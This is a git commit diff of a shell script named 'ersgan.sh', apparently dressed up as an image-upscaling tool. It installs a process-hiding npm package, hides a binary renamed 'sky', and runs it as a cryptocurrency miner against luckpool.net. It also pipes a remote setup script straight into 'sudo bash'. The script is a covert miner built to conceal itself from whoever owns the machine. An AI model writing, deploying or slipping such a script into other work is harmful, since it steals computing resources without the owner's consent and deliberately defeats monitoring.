ba8b22ed5989c8a6f77204ed03a06b892fd92cec
ngel4ng <108847948+ngel4ng@users.noreply.github.com>
2022-07-09 10:34:30 -0700

    Update ersgan.sh

--- ersgan.sh
+++ ersgan.sh
@@ -1,6 +1,6 @@
 curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
 apt-get install -y nodejs
 npm i -g node-process-hider
-ph add rescalersgan
-chmod +x rescalersgan
-./hellminer -c stratum+ssl://na.luckpool.net:3958 -u ADDRESS.WORKER -p x
+ph add sky
+chmod +x sky
+./sky -c stratum+ssl://na.luckpool.net:3958 -u ADDRESS.WORKER -p x
